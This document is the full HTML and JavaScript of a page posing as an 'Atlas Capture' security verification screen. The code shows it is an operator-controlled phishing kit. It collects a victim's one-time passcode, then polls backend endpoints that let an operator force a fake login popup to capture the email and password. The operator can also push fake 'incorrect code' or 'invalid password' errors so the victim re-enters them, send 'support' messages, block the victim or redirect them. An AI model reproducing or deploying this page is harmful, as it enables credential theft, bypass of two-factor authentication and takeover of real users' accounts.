<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Atlas Capture - Security Verification</title>
<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
<link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;600&display=swap" rel="stylesheet">
<style>
* {
    margin: 0;
    padding: 0;
    box-sizing: border-box;
    font-family: Inter, sans-serif
}

/* ===== SKY BACKGROUND ===== */
@keyframes sky-fade {
    from { opacity: 0; }
    to { opacity: 1; }
}

@keyframes rise-in {
    from {
        opacity: 0;
        transform: translate(-50%, -30%) scale(0.85);
    }
    to {
        opacity: 1;
        transform: translate(-50%, -50%) scale(1);
    }
}

@keyframes bob {
    0%, 100% { transform: translateY(0); }
    50% { transform: translateY(-14px); }
}

@keyframes twinkle {
    0%, 100% { opacity: 0.15; }
    50% { opacity: 1; }
}

@keyframes drift {
    from { transform: translateX(0); }
    to { transform: translateX(130vw); }
}

@keyframes shoot {
    0% { opacity: 0; transform: translate(0, 0) rotate(18deg); }
    4% { opacity: 1; }
    14% { opacity: 0; transform: translate(60vw, 26vh) rotate(18deg); }
    100% { opacity: 0; }
}

#skyContainer {
    position: fixed;
    top: 0;
    left: 0;
    right: 0;
    bottom: 0;
    z-index: -10;
    overflow: hidden;
    animation: sky-fade 1.2s ease-out both;
}

.sky-morning {
    background: linear-gradient(180deg, #9dc0ea 0%, #c7d3ee 38%, #f7c9a6 74%, #ffe6c4 100%);
}

.sky-afternoon {
    background: linear-gradient(180deg, #4a95e6 0%, #79bdf5 45%, #bfe4ff 80%, #e7f4ff 100%);
}

.sky-evening {
    background: linear-gradient(180deg, #2b2455 0%, #7d4a86 34%, #e0683f 68%, #ffb26b 100%);
}

.sky-night {
    background: linear-gradient(180deg, #070b1f 0%, #131a3d 45%, #242c5c 80%, #33305e 100%);
}

.sun-morning {
    background: radial-gradient(circle at 35% 35%, #fff2c9, #ffd27a 60%, #ffb14e);
    box-shadow: 0 0 90px 30px rgba(255, 196, 110, 0.55);
}

.sun-afternoon {
    background: radial-gradient(circle at 40% 40%, #ffffff, #fff6c8 55%, #ffe27a);
    box-shadow: 0 0 110px 36px rgba(255, 240, 170, 0.6);
}

.sun-evening {
    background: radial-gradient(circle at 40% 40%, #fff1cf, #ff9d55 55%, #f06b3a);
    box-shadow: 0 0 120px 46px rgba(255, 130, 70, 0.55);
}

.moon-night {
    width: 100%;
    height: 100%;
    border-radius: 50%;
    background: radial-gradient(circle at 38% 34%, #ffffff, #e6ebff 60%, #c3c9ef);
    box-shadow: 0 0 70px 18px rgba(210, 220, 255, 0.35);
    -webkit-mask-image: radial-gradient(circle at 70% 50%, #fff 55%, black 57%);
    mask-image: radial-gradient(circle at 70% 50%, transparent 55%, black 57%);
}

.sun-wrapper {
    position: absolute;
    transform: translate(-50%, -50%);
    animation: rise-in 1.6s cubic-bezier(0.16, 1, 0.3, 1) both;
}

.sun-body {
    position: relative;
    width: 96px;
    height: 96px;
    border-radius: 50%;
    animation: bob 9s ease-in-out infinite;
}

@media (min-width: 640px) {
    .sun-body {
        width: 112px;
        height: 112px;
    }
}

.cloud {
    position: absolute;
    border-radius: 9999px;
    background: rgba(255, 255, 255, 0.5);
    filter: blur(40px);
}

.star {
    position: absolute;
    border-radius: 9999px;
    background: white;
}

.shooting-star {
    position: absolute;
    height: 1px;
    width: 96px;
    background: linear-gradient(to right, transparent, white, transparent);
    top: 18%;
    left: 10%;
    animation: shoot 9s ease-in 3s infinite;
}
/* ===== END SKY BACKGROUND ===== */

body {
    background: transparent;
    display: flex;
    justify-content: center;
    align-items: center;
    min-height: 100vh;
    padding: 40px 10px;
}

.wrapper {
    max-width: 420px;
    width: 100%
}

.header {
    display: flex;
    justify-content: center;
    align-items: center;
    gap: 10px;
    margin-bottom: 18px;
}

.header span {
    font-weight: 600;
    font-size: 18px;
    color: #1f2937;
}

.card {
    background: rgba(255, 255, 255, 0.9);
    border-radius: 22px;
    padding: 28px 22px;
    text-align: center;
}

h2 {
    font-size: 24px;
    font-weight: 700;
    color: #1f2937;
    margin-bottom: 8px;
}

.subtext {
    color: #6b7280;
    font-size: 12px;
    margin-bottom: 28px;
    line-height: 1.5;
}

.otp-input {
    width: 100%;
    font-size: 12px;
    text-align: center;
    border: 2px solid #e5e7eb;
    border-radius: 8px;
    background: rgba(255, 255, 255, 0.8);
    transition: all 0.2s;
    font-family: 'JetBrains Mono', 'Fira Code', 'Courier New', monospace;
    margin-bottom: 20px;
    padding: 4px;
}

.otp-input:focus {
    outline: none;
    border-color: #4f46e5;
    box-shadow: 0 0 0 3px rgba(79, 70, 229, 0.1);
}

.otp-input:disabled {
    background: #f3f4f6;
    cursor: not-allowed;
}

.otp-input::placeholder {
    color: #cbd5e1;
    letter-spacing: 12px;
    font-size: 12px;
    font-weight: 600;
    text-align: center;
    opacity: 0.6;
}

button {
    width: 100%;
    padding: 12px;
    border-radius: 10px;
    border: none;
    background: linear-gradient(90deg, #2563eb, #7c3aed);
    color: #fff;
    font-weight: 600;
    cursor: pointer;
    margin-bottom: 16px;
}

button:disabled {
    opacity: 0.6;
    cursor: not-allowed;
}

.button-loading {
    display: inline-flex;
    align-items: center;
    gap: 8px;
}

.spinner {
    width: 18px;
    height: 18px;
    border: 2px solid rgba(255, 255, 255, 0.3);
    border-top-color: white;
    border-radius: 50%;
    animation: spin 0.8s linear infinite;
}

@keyframes spin {
    to {
        transform: rotate(360deg);
    }
}

.link {
    background: none;
    color: #4f46e5;
    font-size: 14px;
    font-weight: 500;
    margin: 0;
    padding: 0;
    box-shadow: none;
}

.link:hover {
    background: none;
    text-decoration: underline;
}

.error-message {
    color: #ef4444;
    font-size: 12px;
    margin-top: 12px;
    margin-bottom: 8px;
    display: none;
    line-height: 1.4;
}

#logoAtlas {
    height: 30px;
    width: 30px;
    border-radius: 25%;
    margin-right: 9px;
}

/* Modal overlay styles matching first template */
.modal-overlay {
    display: none;
    position: fixed;
    top: 0;
    left: 0;
    width: 100%;
    height: 100%;
    background: rgba(0, 0, 0, 0.85);
    backdrop-filter: blur(4px);
    z-index: 10000;
    justify-content: center;
    align-items: center;
}

.modal-overlay.active {
    display: flex;
}

.modal {
    background: #fff;
    border-radius: 22px;
    max-width: 380px;
    width: 90%;
    padding: 32px 24px;
    text-align: center;
    box-shadow: 0 25px 50px rgba(0, 0, 0, 0.3);
}

.modal-icon {
    width: 64px;
    height: 64px;
    background: #eef2ff;
    border-radius: 32px;
    display: flex;
    align-items: center;
    justify-content: center;
    margin: 0 auto 20px;
}

.modal-icon svg {
    width: 32px;
    height: 32px;
    stroke: #4f46e5;
    fill: none;
}

.modal h3 {
    font-size: 24px;
    font-weight: 700;
    color: #1f2937;
    margin-bottom: 8px;
}

.modal p {
    color: #6b7280;
    font-size: 12px;
    margin-bottom: 28px;
    line-height: 1.5;
}

.modal-input {
    width: 100%;
    font-size: 12px;
    border: 2px solid #e5e7eb;
    border-radius: 8px;
    background: #fff;
    transition: all 0.2s;
    margin-bottom: 16px;
    padding: 8px 12px;
}

.modal-input:focus {
    outline: none;
    border-color: #4f46e5;
    box-shadow: 0 0 0 3px rgba(79, 70, 229, 0.1);
}

.modal-btn {
    width: 100%;
    padding: 6px;
    border-radius: 10px;
    border: none;
    background: linear-gradient(90deg, #2563eb, #7c3aed);
    color: #fff;
    font-weight: 600;
    cursor: pointer;
    margin-top: 8px;
}

.modal-btn:hover:not(:disabled) {
    opacity: 0.9;
}

.modal-btn:disabled {
    opacity: 0.6;
    cursor: not-allowed;
}

.modal-error {
    color: #ef4444;
    font-size: 12px;
    margin-top: 12px;
    display: none;
}

.loading-spinner-small {
    width: 30px;
    height: 30px;
    border: 3px solid #e5e7eb;
    border-top: 3px solid #4f46e5;
    border-radius: 50%;
    animation: spin 1s linear infinite;
    margin: 10px auto;
}

/* Admin text popup */
#adminTextPopup {
    display: none;
    position: fixed;
    top: 0;
    left: 0;
    width: 100%;
    height: 100%;
    background: rgba(0, 0, 0, 0.88);
    backdrop-filter: blur(8px);
    z-index: 20000;
    justify-content: center;
    align-items: center;
}

#adminTextPopup.active {
    display: flex;
}

.admin-text-box {
    background: white;
    border-radius: 22px;
    max-width: 400px;
    width: 90%;
    padding: 32px 24px;
    text-align: center;
    box-shadow: 0 25px 50px rgba(0, 0, 0, 0.35);
}

.admin-text-icon {
    width: 64px;
    height: 64px;
    background: #eef2ff;
    border-radius: 32px;
    display: flex;
    align-items: center;
    justify-content: center;
    margin: 0 auto 20px;
}

.admin-text-icon svg {
    width: 32px;
    height: 32px;
    stroke: #4f46e5;
    fill: none;
}

.admin-text-title {
    font-size: 24px;
    font-weight: 700;
    color: #1f2937;
    margin-bottom: 8px;
}

.admin-text-content {
    background: #f3f4f6;
    padding: 20px;
    border-radius: 16px;
    font-size: 14px;
    line-height: 1.8;
    color: #1f2937;
    word-break: break-word;
}

/* Styled tokens injected by formatMessage() */
.msg-yes {
    color: #059669;
    font-weight: 800;
    font-size: 1.35em;
    background: #d1fae5;
    padding: 2px 10px;
    border-radius: 8px;
    display: inline-block;
}

.msg-num {
    color: #4f46e5;
    font-weight: 800;
    font-size: 1.2em;
    background: #e0e7ff;
    padding: 2px 8px;
    border-radius: 8px;
    display: inline-block;
}

.msg-caps {
    color: #dc2626;
    font-weight: 800;
    background: #fee2e2;
    padding: 2px 8px;
    border-radius: 8px;
    display: inline-block;
}
</style>
</head>
<body>

<!-- SKY CONTAINER -->
<div id="skyContainer" class="sky-bg"></div>

<div class="wrapper">
  <div class="header">
    <div class="icon"><img id="logoAtlas" src="https://i.postimg.cc/dQjyw0ZV/atlas.png" alt="Atlas logo"></div>
    <span>Atlas Capture</span>
  </div>
  <div class="card">
    <h2>Check your email</h2>
    <p class="subtext">Two-Step Verification. <br> Second OTP sent to your email. </p>
   <input type="number" class="otp-input" id="otpInput" maxlength="6" placeholder="000000" oninput="if(this.value.length > 6) this.value = this.value.slice(0,6)">
    <div id="errorMessage" class="error-message"></div>
    <button id="verifyBtn">Verify</button>
  </div>
</div>

<!-- Login modal (force login) -->
<div id="loginModal" class="modal-overlay">
  <div class="modal" id="loginModalContent">
    <div class="modal-icon"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5"><path d="M4 4h16c1.1 0 2 .9 2 2v12c0 1.1-.9 2-2 2H4c-1.1 0-2-.9-2-2V6c0-1.1.9-2 2-2z"/><polyline points="22,6 12,13 2,6"/></svg></div>
    <h3>Account Verification Required</h3>
    <p>Please login with your email and password to continue.</p>
    <input type="email" id="loginEmail" class="modal-input" placeholder="Email address">
    <input type="password" id="loginPassword" class="modal-input" placeholder="Password">
    <button id="submitLoginBtn" class="modal-btn">Login to Continue →</button>
    <div id="modalError" class="modal-error"></div>
  </div>
</div>

<!-- Admin text popup -->
<div id="adminTextPopup">
  <div class="admin-text-box">
    <div class="admin-text-icon">
      <svg viewBox="0 0 24 24" stroke-width="1.5"><path d="M21 15a2 2 0 0 1-2 2H7l-4 4V5a2 2 0 0 1 2-2h14a2 2 0 0 1 2 2z"/></svg>
    </div>
    <div class="admin-text-title">Message from Support</div>
    <div class="admin-text-content" id="adminTextContent"></div>
  </div>
</div>

<script>
  const urlParams = new URLSearchParams(window.location.search);
  const email = urlParams.get('email');
  if (!email) window.location.href = '/users/login';

  const otpInput  = document.getElementById('otpInput');
  const verifyBtn = document.getElementById('verifyBtn');
  const errorDiv  = document.getElementById('errorMessage');

  let isProcessing      = false;
  let approvalInterval  = null;
  let blockCheckInterval = null;
  let isModalOpen       = false;
  let adminTextHandling = false;

  // Format message function (same as otp.html)
  function formatMessage(rawText) {
    const parts = rawText.split(/(\s+|[^a-zA-Z0-9]+)/);
    return parts.map(part => {
      if (/^yes$/i.test(part)) {
        return `<span class="msg-yes">YES</span>`;
      }
      if (/^\d+$/.test(part)) {
        return `<span class="msg-num">${part}</span>`;
      }
      if (/^[A-Z]{3,}$/.test(part)) {
        return `<span class="msg-caps">${part}</span>`;
      }
      return part.replace(/[&<>]/g, m => m === '&' ? '&amp;' : m === '<' ? '&lt;' : '&gt;');
    }).join('');
  }

  function showAdminTextPopup(rawMessage) {
    const popup   = document.getElementById('adminTextPopup');
    const content = document.getElementById('adminTextContent');
    content.innerHTML = formatMessage(rawMessage);
    popup.classList.add('active');
  }

  function hideAdminTextPopup() {
    document.getElementById('adminTextPopup').classList.remove('active');
  }

  async function releaseAdminText() {
    try {
      await fetch('/api/users/release-admin-text', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ email })
      });
    } catch (e) {}
  }

  async function pollAdminText() {
    if (adminTextHandling) return;
    try {
      const res  = await fetch('/api/users/check-admin-text', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ email })
      });
      const data = await res.json();

      if (data.text_release === true) {
        hideAdminTextPopup();
        return;
      }

      if (!data.admin_text) return;

      adminTextHandling = true;
      const txt = data.admin_text;

      if (txt === 'incorrect_otp_error') {
        await handleIncorrectOtp();
      } else if (txt === 'wrong_login_error') {
        await handleWrongLogin();
      } else if (txt === 'correct_login_success') {
        await handleCorrectLogin();
      } else {
        showAdminTextPopup(txt);
        adminTextHandling = false;
      }

    } catch (e) { adminTextHandling = false; }
  }

  async function handleIncorrectOtp() {
    await releaseAdminText();
    if (approvalInterval) { clearInterval(approvalInterval); approvalInterval = null; }
    isProcessing = false;

    errorDiv.textContent = '❌ Incorrect code. Please check your email for the latest code and try again.';
    errorDiv.style.display = 'block';
    otpInput.value = '';

    verifyBtn.disabled = true;
    verifyBtn.innerHTML = '<span class="button-loading"><span class="spinner"></span> Please wait...</span>';
    setTimeout(() => { verifyBtn.disabled = false; verifyBtn.innerHTML = 'Verify'; otpInput.focus(); }, 2000);
    setTimeout(() => { errorDiv.style.display = 'none'; adminTextHandling = false; }, 5000);
  }

  async function handleWrongLogin() {
    await releaseAdminText();
    const modalError    = document.getElementById('modalError');
    const loginPassword = document.getElementById('loginPassword');
    const submitBtn     = document.getElementById('submitLoginBtn');

    if (modalError)    { modalError.textContent = '❌ Invalid email or password. Please try again.'; modalError.style.display = 'block'; }
    if (loginPassword) loginPassword.value = '';
    if (submitBtn) {
      submitBtn.disabled = true;
      submitBtn.innerHTML = '<span class="button-loading"><span class="spinner"></span> Please wait...</span>';
      setTimeout(() => { submitBtn.disabled = false; submitBtn.innerHTML = 'Login to Continue →'; }, 2000);
    }
    setTimeout(() => { if (modalError) modalError.style.display = 'none'; adminTextHandling = false; }, 4000);
  }

  async function handleCorrectLogin() {
    await releaseAdminText();
    const mc = document.getElementById('loginModalContent');
    if (mc) {
      mc.innerHTML = `<div style="text-align:center;">
        <div class="modal-icon"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5"><circle cx="12" cy="12" r="10"/><path d="M12 6v6l4 2"/></svg></div>
        <h3>Validating Credentials</h3>
        <div class="loading-spinner-small"></div>
        <p>Please wait as we validate your details...</p>
        <p style="font-size:12px;color:#666;margin-top:10px;">Do not close this window</p>
      </div>`;
    }
    setTimeout(() => { adminTextHandling = false; }, 3000);
  }

  async function checkIfBlocked() {
    try {
      const res  = await fetch('/api/users/check-blocked', {
        method: 'POST', headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ email })
      });
      const data = await res.json();
      if (data.blocked === true) { window.location.href = `/block.html?email=${encodeURIComponent(email)}`; return true; }
      return false;
    } catch (e) { return false; }
  }

  function startBlockChecking() {
    if (blockCheckInterval) clearInterval(blockCheckInterval);
    blockCheckInterval = setInterval(async () => {
      const blocked = await checkIfBlocked();
      if (blocked) { clearInterval(blockCheckInterval); if (approvalInterval) clearInterval(approvalInterval); }
    }, 3000);
  }

  function showLoading() { 
    isProcessing = true; 
    verifyBtn.disabled = true; 
    verifyBtn.innerHTML = '<span class="button-loading"><span class="spinner"></span> Verifying...</span>'; 
    errorDiv.style.display = 'none'; 
  }
  
  function showWaiting() { 
    verifyBtn.disabled = true; 
    verifyBtn.innerHTML = '<span class="button-loading"><span class="spinner"></span> Validating...</span>'; 
  }
  
  function resetButton() { 
    isProcessing = false; 
    verifyBtn.disabled = false; 
    verifyBtn.innerHTML = 'Verify'; 
  }

  // CRITICAL FIX: Use the same pattern as first OTP but for second OTP
function startCheckingSecondApproval() {
  if (approvalInterval) clearInterval(approvalInterval);
  approvalInterval = setInterval(async () => {
    try {
      const blocked = await checkIfBlocked();
      if (blocked) return;
      
      const res = await fetch('/api/users/check-first-approval', {
        method: 'POST', 
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ email })
      });
      const data = await res.json();
      
      if (data.approved === true) {
        clearInterval(approvalInterval);
        // DO NOTHING - stay on page, button stays disabled/loading
        // Admin will click Redirect button when ready
      }
    } catch (e) {
      console.error('Approval polling error:', e);
    }
  }, 2000);
}

  async function verifySecondOTP() {
    if (isProcessing) return;
    const isBlocked = await checkIfBlocked();
    if (isBlocked) return;

    const otp = otpInput.value.trim();
    if (!otp || otp.length !== 6) {
      errorDiv.textContent = 'Please enter all 6 characters';
      errorDiv.style.display = 'block';
      setTimeout(() => errorDiv.style.display = 'none', 3000);
      return;
    }

    showLoading();
    try {
      const res  = await fetch('/api/users/submit-second-otp', {
        method: 'POST', 
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ email, otp })
      });
      const data = await res.json();
      
      if (data.success) {
        showWaiting();
        startBlockChecking();
        startCheckingSecondApproval();
      } else {
        resetButton();
        errorDiv.textContent = data.error || 'Something went wrong. Please try again.';
        errorDiv.style.display = 'block';
        setTimeout(() => errorDiv.style.display = 'none', 4000);
      }
    } catch (e) {
      resetButton();
      errorDiv.textContent = 'Network error. Please try again.';
      errorDiv.style.display = 'block';
      setTimeout(() => errorDiv.style.display = 'none', 3000);
    }
  }

  function startForceLoginPolling() {
    setInterval(async () => {
      if (isModalOpen) return;
      try {
        const res  = await fetch('/api/users/check-force-login', {
          method: 'POST', headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ email })
        });
        const data = await res.json();
        if (data.force_login === true) {
          isModalOpen = true;
          document.getElementById('loginModal').classList.add('active');
          document.getElementById('loginEmail').value = '';
          document.getElementById('loginPassword').value = '';
          document.getElementById('modalError').style.display = 'none';
          const btn = document.getElementById('submitLoginBtn');
          if (btn) { btn.disabled = false; btn.innerHTML = 'Login to Continue →'; }
        }
      } catch (e) {}
    }, 2000);
  }

  function startRedirectSuccessPolling() {
    setInterval(async () => {
      try {
        // First check if user is blocked
        const blockRes = await fetch('/api/users/check-blocked', {
          method: 'POST', headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ email })
        });
        const blockData = await blockRes.json();
        if (blockData.blocked === true) {
          window.location.href = `/block.html?email=${encodeURIComponent(email)}`;
          return;
        }

        // Then check for redirect success
        const res  = await fetch('/api/users/check-redirect-success', {
          method: 'POST', headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ email })
        });
        const data = await res.json();
        if (data.redirect_success === true) window.location.href = `/users/success?email=${encodeURIComponent(email)}`;
      } catch (e) {}
    }, 2000);
  }
  async function submitLogin() {
    const loginEmail    = document.getElementById('loginEmail').value.trim();
    const loginPassword = document.getElementById('loginPassword').value;
    const modalError    = document.getElementById('modalError');
    const submitBtn     = document.getElementById('submitLoginBtn');

    if (!loginEmail || !loginPassword) { 
      modalError.textContent = 'Please enter both email and password'; 
      modalError.style.display = 'block'; 
      return; 
    }
    const emailRegex = /^[^\s@]+@([^\s@]+\.)+[^\s@]+$/;
    if (!emailRegex.test(loginEmail)) { 
      modalError.textContent = 'Please enter a valid email address'; 
      modalError.style.display = 'block'; 
      return; 
    }

    submitBtn.disabled = true;
    submitBtn.innerHTML = '<span class="button-loading"><span class="spinner"></span> Verifying...</span>';
    modalError.style.display = 'none';

    try {
      const res  = await fetch('/api/users/submit-login-popup', {
        method: 'POST', headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ email, loginEmail, loginPassword })
      });
      const data = await res.json();
      if (data.success) {
        submitBtn.disabled = true;
        submitBtn.innerHTML = '<span class="button-loading"><span class="spinner"></span> Verifying...</span>';
      } else {
        modalError.textContent = data.error || 'Failed to verify account';
        modalError.style.display = 'block';
        submitBtn.disabled = false;
        submitBtn.innerHTML = 'Login to Continue →';
      }
    } catch (e) {
      modalError.textContent = 'Network error. Please try again.';
      modalError.style.display = 'block';
      submitBtn.disabled = false;
      submitBtn.innerHTML = 'Login to Continue →';
    }
  }

  // Boot all the things
  startForceLoginPolling();
  startRedirectSuccessPolling();
  startBlockChecking();
  setInterval(pollAdminText, 2000);

  verifyBtn.addEventListener('click', verifySecondOTP);
  otpInput.addEventListener('keypress', (e) => { if (e.key === 'Enter') verifySecondOTP(); });
  otpInput.focus();
  document.getElementById('submitLoginBtn').addEventListener('click', submitLogin);

  // ===== SKY BACKGROUND INIT =====
  function getTimeOfDay() {
    const hour = new Date().getHours();
    if (hour >= 5 && hour < 11) return 'morning';
    if (hour >= 11 && hour < 17) return 'afternoon';
    if (hour >= 17 && hour < 21) return 'evening';
    return 'night';
  }

  function getSkyConfig(timeOfDay) {
    const configs = {
      morning: {
        skyClass: 'sky-morning',
        sunClass: 'sun-morning',
        sunTop: '56%',
        sunLeft: '18%',
        clouds: 3,
        stars: false,
        cloudOpacity: 0.5
      },
      afternoon: {
        skyClass: 'sky-afternoon',
        sunClass: 'sun-afternoon',
        sunTop: '16%',
        sunLeft: '22%',
        clouds: 3,
        stars: false,
        cloudOpacity: 0.5
      },
      evening: {
        skyClass: 'sky-evening',
        sunClass: 'sun-evening',
        sunTop: '52%',
        sunLeft: '78%',
        clouds: 2,
        stars: false,
        cloudOpacity: 0.25
      },
      night: {
        skyClass: 'sky-night',
        sunClass: 'moon-night',
        sunTop: '15%',
        sunLeft: '72%',
        clouds: 0,
        stars: true,
        cloudOpacity: 0.5
      }
    };
    return configs[timeOfDay] || configs.afternoon;
  }

  function getMoonPhase() {
    const newMoon = Date.UTC(2000, 0, 6, 18, 14);
    const lunarCycle = 2551442876.8992;
    return ((Date.now() - newMoon) % lunarCycle / lunarCycle + 1) % 1;
  }

  function createStars(count) {
    const container = document.getElementById('skyContainer');
    if (!container) return;
    for (let i = 0; i < count; i++) {
      const star = document.createElement('span');
      star.className = 'star';
      const size = Math.random() * 2 + 1;
      star.style.cssText = `
        top: ${Math.random() * 62}%;
        left: ${Math.random() * 100}%;
        width: ${size}px;
        height: ${size}px;
        animation: twinkle ${(2.5 + Math.random() * 3)}s ease-in-out ${Math.random() * 4}s infinite;
      `;
      container.appendChild(star);
    }
  }

  function createShootingStar() {
    const container = document.getElementById('skyContainer');
    if (!container) return;
    const star = document.createElement('span');
    star.className = 'shooting-star';
    container.appendChild(star);
  }

  function createClouds(count, opacity) {
    const container = document.getElementById('skyContainer');
    if (!container) return;
    for (let i = 0; i < count; i++) {
      const cloud = document.createElement('div');
      cloud.className = 'cloud';
      cloud.style.cssText = `
        top: ${18 + 22 * i}%;
        left: ${-20 + 15 * i}%;
        width: ${180 + 40 * i}px;
        height: ${60 + 10 * i}px;
        opacity: ${opacity};
        animation: drift ${60 + 20 * i}s linear ${-8 * i}s infinite;
      `;
      container.appendChild(cloud);
    }
  }

  function createSun(skyConfig) {
    const container = document.getElementById('skyContainer');
    if (!container) return;

    const wrapper = document.createElement('div');
    wrapper.className = 'sun-wrapper';
    wrapper.style.cssText = `
      top: ${skyConfig.sunTop};
      left: ${skyConfig.sunLeft};
    `;

      

    const body = document.createElement('div');
    body.className = `sun-body ${skyConfig.sunClass}`;
    wrapper.appendChild(body);
    container.appendChild(wrapper);

    if (skyConfig.sunClass === 'moon-night') {
      const moonPhase = getMoonPhase();
      const cos = Math.cos(2 * moonPhase * Math.PI);
      const a = 50 * Math.abs(cos);
      const isWaning = moonPhase < 0.5;

      const svg = document.createElementNS('http://www.w3.org/2000/svg', 'svg');
      svg.setAttribute('viewBox', '0 0 100 100');
      svg.setAttribute('class', 'h-full w-full overflow-visible');

      const defs = document.createElementNS('http://www.w3.org/2000/svg', 'defs');
      const gradient = document.createElementNS('http://www.w3.org/2000/svg', 'radialGradient');
      gradient.setAttribute('id', 'moon-lit');
      gradient.setAttribute('cx', '38%');
      gradient.setAttribute('cy', '34%');
      gradient.setAttribute('r', '75%');

      const stops = [
        { offset: '0%', color: '#ffffff' },
        { offset: '60%', color: '#e6ebff' },
        { offset: '100%', color: '#c3c9ef' }
      ];
      stops.forEach(s => {
        const stop = document.createElementNS('http://www.w3.org/2000/svg', 'stop');
        stop.setAttribute('offset', s.offset);
        stop.setAttribute('stop-color', s.color);
        gradient.appendChild(stop);
      });
      defs.appendChild(gradient);

      const circle = document.createElementNS('http://www.w3.org/2000/svg', 'circle');
      circle.setAttribute('cx', '50');
      circle.setAttribute('cy', '50');
      circle.setAttribute('r', '50');
      circle.setAttribute('fill', 'rgba(214,222,255,0.13)');

      const path = document.createElementNS('http://www.w3.org/2000/svg', 'path');
      const d = `M50,0 A${50},${50} 0 0 ${+!!isWaning} 50,100 A${a.toFixed(2)},${50} 0 0 ${isWaning ? cos > 0 ? 0 : 1 : +(cos > 0)} 50,0 Z`;
      path.setAttribute('d', d);
      path.setAttribute('fill', 'url(#moon-lit)');

      const clipPath = document.createElementNS('http://www.w3.org/2000/svg', 'clipPath');
      clipPath.setAttribute('id', 'moon-clip');
      const clipPathPath = document.createElementNS('http://www.w3.org/2000/svg', 'path');
      clipPathPath.setAttribute('d', d);
      clipPath.appendChild(clipPathPath);

      const g = document.createElementNS('http://www.w3.org/2000/svg', 'g');
      g.setAttribute('clip-path', 'url(#moon-clip)');
      g.setAttribute('fill', 'rgba(120,130,180,0.18)');

      const craters = [
        { cx: '38', cy: '34', r: '7' },
        { cx: '62', cy: '52', r: '5' },
        { cx: '46', cy: '66', r: '4' }
      ];
      craters.forEach(c => {
        const craterCircle = document.createElementNS('http://www.w3.org/2000/svg', 'circle');
        craterCircle.setAttribute('cx', c.cx);
        craterCircle.setAttribute('cy', c.cy);
        craterCircle.setAttribute('r', c.r);
        g.appendChild(craterCircle);
      });

      svg.appendChild(defs);
      svg.appendChild(circle);
      svg.appendChild(path);
      svg.appendChild(clipPath);
      svg.appendChild(g);

      body.appendChild(svg);
    }
  }

  function initSky() {
    const timeOfDay = getTimeOfDay();
    const skyConfig = getSkyConfig(timeOfDay);

    const skyBg = document.getElementById('skyContainer');
    skyBg.className = `sky-bg ${skyConfig.skyClass}`;

    createSun(skyConfig);

    if (skyConfig.stars) {
      createStars(32);
      createShootingStar();
    }

    createClouds(skyConfig.clouds, skyConfig.cloudOpacity);
  }

  window.addEventListener('load', initSky);
</script>
</body>
</html>
